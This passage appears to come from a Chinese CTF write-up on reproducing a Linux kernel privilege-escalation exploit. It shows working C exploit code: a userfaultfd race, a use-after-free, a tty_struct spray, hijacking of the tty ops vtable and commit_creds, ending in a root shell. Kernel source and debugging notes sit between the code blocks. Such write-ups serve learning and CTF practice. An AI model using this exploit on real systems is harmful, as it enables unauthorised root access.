</span></span><span style=display:flex><span>	<span style=color:#902000>int</span> tty_fd;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	stuck_mapped_memory <span style=color:#666>=</span> mmap(<span style=color:#007020>NULL</span>, PAGE_SIZE, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_ANONYMOUS <span style=color:#666>|</span> MAP_PRIVATE, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	RegisterUserfault(stuck_mapped_memory, userfaultfd_stuck_handler);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	OpenNote();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	noteadd(<span style=color:#40a070>0</span>, <span style=color:#40a070>0x60</span>, buf_a);
</span></span><span style=display:flex><span>	noteedit(<span style=color:#40a070>0</span>, TTY_STRUCT_SZIE, buf_a);
</span></span><span style=display:flex><span>	write(note_fd, buf_a, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	pthread_t thr_edit, thr_add;
</span></span><span style=display:flex><span>	pthread_create(<span style=color:#666>&amp;</span>thr_edit, <span style=color:#007020>NULL</span>, edit_thread, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	pthread_create(<span style=color:#666>&amp;</span>thr_add, <span style=color:#007020>NULL</span>, add_thread, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;ready to open ptmx&#34;</span>);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>20</span>; i<span style=color:#666>++</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		tty_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/ptmx&#34;</span>, O_RDWR);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (tty_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			ErrExit(<span style=color:#4070a0>&#34;[-] ptmx open failed!&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		read(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>==</span> <span style=color:#40a070>0x100005401</span>)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>			printf(<span style=color:#4070a0>&#34;[+] tty_struct found! fd = %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, tty_fd);
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>; <span style=color:#60a0b0;font-style:italic>// tty_struct used our slab
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (buf_tty[<span style=color:#40a070>0</span>] <span style=color:#666>!=</span> <span style=color:#40a070>0x100005401</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		ErrExit(<span style=color:#4070a0>&#34;[-] leak failed&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	size_t ptm_unix98_ops_addr <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>3</span>];
</span></span><span style=display:flex><span>	size_t work_for_cpu_fn_addr <span style=color:#666>=</span>  work_for_cpu_fn_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>	size_t tty_struct_addr <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>10</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x50</span>;
</span></span><span style=display:flex><span>	size_t commit_creds_addr <span style=color:#666>=</span> commit_creds_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>	size_t prepare_kernel_cred_addr <span style=color:#666>=</span> prepare_kernel_cred_off <span style=color:#666>+</span> ptm_unix98_ops_addr;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] ptm_unix98_ops addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, ptm_unix98_ops_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] work_for_cpu_fn addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, work_for_cpu_fn_addr);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] tty_struct addr leaked, addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, tty_struct_addr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	write(tty_fd, <span style=color:#40a070>1</span>, <span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	size_t buf_gift[<span style=color:#40a070>0x100</span>];
</span></span><span style=display:flex><span>	notegift(buf_gift);
</span></span><span style=display:flex><span>	size_t note_0_addr <span style=color:#666>=</span> buf_gift[<span style=color:#40a070>0</span> <span style=color:#666>*</span> <span style=color:#40a070>2</span>];
</span></span><span style=display:flex><span>	assert(note_0_addr <span style=color:#666>==</span> tty_struct_addr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> tty_struct_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> prepare_kernel_cred_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>7</span>] <span style=color:#666>=</span> work_for_cpu_fn_addr;
</span></span><span style=display:flex><span>	write(note_fd, buf_tty, <span style=color:#40a070>0</span>); <span style=color:#60a0b0;font-style:italic>// write to tty_struct
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>	write(tty_fd, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	read(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] prepare_kernel_cred finished, return 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, buf_tty[<span style=color:#40a070>6</span>]);
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> tty_struct_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> commit_creds_addr;
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> buf_tty[<span style=color:#40a070>6</span>];
</span></span><span style=display:flex><span>	buf_tty[<span style=color:#40a070>7</span>] <span style=color:#666>=</span> work_for_cpu_fn_addr;
</span></span><span style=display:flex><span>	write(note_fd, buf_tty, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>	sleep(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#4070a0>&#34;[+] write tty finished (second time)&#34;</span>);
</span></span><span style=display:flex><span>	write(tty_fd, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;now uid = %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, getuid());
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (getuid() <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		puts(<span style=color:#4070a0>&#34;[+] root now!&#34;</span>);
</span></span><span style=display:flex><span>		system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>比较奇怪的是我在修改了虚表后执行 write 并无法取得我想要的效果，使用 gdb attach 上去下断点也断不下来，非常的奇怪，明天再研究研究。</p><p>另外 slub 的机制让我有点迷惑，他似乎不是后进先出的，所以在 open ptmx 的时候需要多次 open，我通过魔数来判断是否申请到了我们 UAF 的 slab。</p><h3 id=716-终于复现成功>7.16 终于复现成功</h3><p>昨天碰到的问题在今天终于部分解决了。首先是 leak 的小问题，leak 时使用的数据是结构体的虚表，这张虚表可能是 ptm_unix98_ops，也可能是 pty_unix98_ops，两者只差了 0x120，所以特判一下就可以实现 leak，也就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>if</span> ((ptm_unix98_ops_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFF</span>) <span style=color:#666>==</span> <span style=color:#40a070>0x320</span>) ptm_unix98_ops_addr <span style=color:#666>+=</span> <span style=color:#40a070>0x120</span>;
</span></span></code></pre></div><p>然后是碰到即便修改了虚表后，调用 write 也无法执行 work_for_cpu_fn 函数的问题。我一直以为这里 write 的逻辑，用面向对象的思维来看就是直接调用 tty_struct 类重写的 write 虚函数，类似于 _IO_FILE 劫持虚表中的 write 指针后 write 就会直接执行劫持的函数的逻辑了。但是实际上不是这样的，在掉用虚表中函数指针前会先调用 tty_write 函数</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> ssize_t <span style=color:#06287e>tty_write</span>(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span>file, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> __user <span style=color:#666>*</span>buf,
</span></span><span style=display:flex><span>						size_t count, loff_t <span style=color:#666>*</span>ppos)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty <span style=color:#666>=</span> file_tty(file);
</span></span><span style=display:flex><span> 	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_ldisc</span> <span style=color:#666>*</span>ld;
</span></span><span style=display:flex><span>	ssize_t ret;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (tty_paranoia_check(tty, file_inode(file), <span style=color:#4070a0>&#34;tty_write&#34;</span>))
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EIO;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>tty <span style=color:#666>||</span> <span style=color:#666>!</span>tty<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>write <span style=color:#666>||</span>	tty_io_error(tty))
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span>EIO;
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* Short term debug to catch buggy drivers */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (tty<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>write_room <span style=color:#666>==</span> <span style=color:#007020>NULL</span>)
</span></span><span style=display:flex><span>		tty_err(tty, <span style=color:#4070a0>&#34;missing write_room method</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>	ld <span style=color:#666>=</span> tty_ldisc_ref_wait(tty);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>ld)
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> hung_up_tty_write(file, buf, count, ppos);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>ld<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>write)
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#666>-</span>EIO;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>else</span>
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> do_tty_write(ld<span style=color:#666>-&gt;</span>ops<span style=color:#666>-&gt;</span>write, tty, file, buf, count);
</span></span><span style=display:flex><span>	tty_ldisc_deref(ld);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>然后到 do_tty_write 中再进行用户态数据的拷贝，最后才实际调用函数指针</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>static</span> <span style=color:#007020;font-weight:700>inline</span> ssize_t <span style=color:#06287e>do_tty_write</span>(
</span></span><span style=display:flex><span>	ssize_t (<span style=color:#666>*</span>write)(<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span>, <span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>, size_t),
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>tty_struct</span> <span style=color:#666>*</span>tty,
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>file</span> <span style=color:#666>*</span>file,
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>const</span> <span style=color:#902000>char</span> __user <span style=color:#666>*</span>buf,
</span></span><span style=display:flex><span>	size_t count)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	ssize_t ret, written <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> chunk;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	ret <span style=color:#666>=</span> tty_write_lock(tty, file<span style=color:#666>-&gt;</span>f_flags <span style=color:#666>&amp;</span> O_NDELAY);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (ret <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>return</span> ret;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/*
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * We chunk up writes into a temporary buffer. This
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * simplifies low-level drivers immensely, since they
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * don&#39;t have locking issues and user mode accesses.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * But if TTY_NO_WRITE_SPLIT is set, we should use a
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * big chunk-size..
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * The default chunk-size is 2kB, because the NTTY
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * layer has problems with bigger chunks. It will
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * claim to be able to handle more characters than
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * it actually does.
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 *
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * FIXME: This can probably go away now except that 64K chunks
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 * are too likely to fail unless switched to vmalloc...
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>	 */</span>
</span></span><span style=display:flex><span>	chunk <span style=color:#666>=</span> <span style=color:#40a070>2048</span>;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (test_bit(TTY_NO_WRITE_SPLIT, <span style=color:#666>&amp;</span>tty<span style=color:#666>-&gt;</span>flags))
</span></span><span style=display:flex><span>		chunk <span style=color:#666>=</span> <span style=color:#40a070>65536</span>;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (count <span style=color:#666>&lt;</span> chunk)
</span></span><span style=display:flex><span>		chunk <span style=color:#666>=</span> count;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* write_buf/write_cnt is protected by the atomic_write_lock mutex */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (tty<span style=color:#666>-&gt;</span>write_cnt <span style=color:#666>&lt;</span> chunk) {
</span></span><span style=display:flex><span>		<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> <span style=color:#666>*</span>buf_chunk;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (chunk <span style=color:#666>&lt;</span> <span style=color:#40a070>1024</span>)
</span></span><span style=display:flex><span>			chunk <span style=color:#666>=</span> <span style=color:#40a070>1024</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>		buf_chunk <span style=color:#666>=</span> kmalloc(chunk, GFP_KERNEL);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>buf_chunk) {
</span></span><span style=display:flex><span>			ret <span style=color:#666>=</span> <span style=color:#666>-</span>ENOMEM;
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>goto</span> out;
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>		kfree(tty<span style=color:#666>-&gt;</span>write_buf);
</span></span><span style=display:flex><span>		tty<span style=color:#666>-&gt;</span>write_cnt <span style=color:#666>=</span> chunk;
</span></span><span style=display:flex><span>		tty<span style=color:#666>-&gt;</span>write_buf <span style=color:#666>=</span> buf_chunk;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>/* Do the write .. */</span>
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> (;;) {
</span></span><span style=display:flex><span>		size_t size <span style=color:#666>=</span> count;
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (size <span style=color:#666>&gt;</span> chunk)
</span></span><span style=display:flex><span>			size <span style=color:#666>=</span> chunk;
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#666>-</span>EFAULT;
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (copy_from_user(tty<span style=color:#666>-&gt;</span>write_buf, buf, size))
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> write(tty, file, tty<span style=color:#666>-&gt;</span>write_buf, size);
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (ret <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>)
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>		written <span style=color:#666>+=</span> ret;
</span></span><span style=display:flex><span>		buf <span style=color:#666>+=</span> ret;
</span></span><span style=display:flex><span>		count <span style=color:#666>-=</span> ret;
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (<span style=color:#666>!</span>count)
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> <span style=color:#666>-</span>ERESTARTSYS;
</span></span><span style=display:flex><span>		<span style=color:#007020;font-weight:700>if</span> (signal_pending(current))
</span></span><span style=display:flex><span>			<span style=color:#007020;font-weight:700>break</span>;
</span></span><span style=display:flex><span>		cond_resched();
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (written) {
</span></span><span style=display:flex><span>		tty_update_time(<span style=color:#666>&amp;</span>file_inode(file)<span style=color:#666>-&gt;</span>i_mtime);
</span></span><span style=display:flex><span>		ret <span style=color:#666>=</span> written;
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span><span style=color:#002070;font-weight:700>out</span>:
</span></span><span style=display:flex><span>	tty_write_unlock(tty);
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> ret;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>这一路上要经过一些检测和各种各样操作，昨天我使用</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>write(tty_fd, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
</span></span></code></pre></div><p>这样的方法调用，一下子就会挂在 copy_from_user 上，此处需要提供一个正确的 buf，和一定的长度，比如</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>write(tty_fd, buf_a, <span style=color:#40a070>1</span>);
</span></span></code></pre></div><p>这样就可以调用到劫持的 work_for_cpu_fn 了。</p><p>由于 work_for_cpu_fn 的参数由 write 调用的第一个参数决定，也就是 tty_struct 本身，那么被调函数偏移在 0x20，这个没什么问题</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>buf_tty[<span style=color:#40a070>4</span>] <span style=color:#666>=</span> prepare_kernel_cred_addr;
</span></span></code></pre></div><p>这样就可以了，然后第一个参数在偏移 0x28 处，也就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>buf_tty[<span style=color:#40a070>5</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span></code></pre></div><p>看似没什么问题，但是之后执行到 work_for_cpu_fn 时偏移 0x28 会莫名其妙的变成 1，导致执行 kernel_prepare_cred 时出错，估计是 tty_write 和 do_tty_write 操作中对此处的成员变量进行了操作（变量本身是一个信号量，这里可能是为了线程同步之类的有一点改变）。</p><p>如果用虚表做 ROP 的话不需要考虑对别的变量的修改，因为不需要考虑参数的问题，但是用 work_for_cpu_fn 来进行函数调用时就需要小心一点了，所以最后我还是根据长亭的 WP 换成了 ioctl 来触发。类似的，在调用函数指针前也先调用了 tty_ioctl，这个函数是一个较为巨大的 switch 结构，所以给予的 cmd 的值要比较小心，我尝试了一些随机数都无法达到效果，最后还是根据长亭 WP 用的 233 实现的，也就是</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>ioctl(tty_fd, <span style=color:#40a070>233</span>, <span style=color:#40a070>233</span>);
</span></span></code></pre></div><p>这样调用。看来 233 这个数确实还是有一些魔力。</p><p>最后的 exp</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;syscall.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;poll.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;pthread.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;string.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;linux/userfaultfd.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/mman.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;assert.h&gt;</span><span style=color:#007020>
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#007020>#define PAGE_SIZE 0x1000
</span></span></span><span style=display:flex><span><span style=color:#007020>#define TTY_STRUCT_SZIE 0x2E0
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span>size_t work_for_cpu_fn_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8949eb90</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffff8a28e440</span>;
</span></span><span style=display:flex><span>size_t prepare_kernel_cred_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffffa14a9ef0</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffffa228e440</span>;
</span></span><span style=display:flex><span>size_t commit_creds_off <span style=color:#666>=</span> <span style=color:#40a070>0xffffffffa14a9b40</span> <span style=color:#666>-</span> <span style=color:#40a070>0xffffffffa228e440</span>;
</span></span><span style=display:flex><span>size_t kernel_base;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>userarg</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	size_t idx;
</span></span><span style=display:flex><span>	size_t size;
</span></span><span style=display:flex><span>	<span style=color:#902000>void</span><span style=color:#666>*</span> buf;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> note_fd;
</span></span><span style=display:flex><span><span style=color:#902000>void</span><span style=color:#666>*</span> stuck_mapped_memory;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>ErrExit</span>(<span style=color:#902000>char</span><span style=color:#666>*</span> err_msg)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(err_msg);
</span></span><span style=display:flex><span>	exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>RegisterUserfault</span>(<span style=color:#902000>void</span> <span style=color:#666>*</span>fault_page, <span style=color:#902000>void</span><span style=color:#666>*</span> handler)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	pthread_t thr;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_api</span> ua;
</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>uffdio_register</span> ur;
</span></span><span style=display:flex><span>	<span style=color:#902000>uint64_t</span> uffd  <span style=color:#666>=</span> syscall(__NR_userfaultfd, O_CLOEXEC <span style=color:#666>|</span> O_NONBLOCK);
</span></span><span style=display:flex><span>	ua.api <span style=color:#666>=</span> UFFD_API;
</span></span><span style=display:flex><span>	ua.features    <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
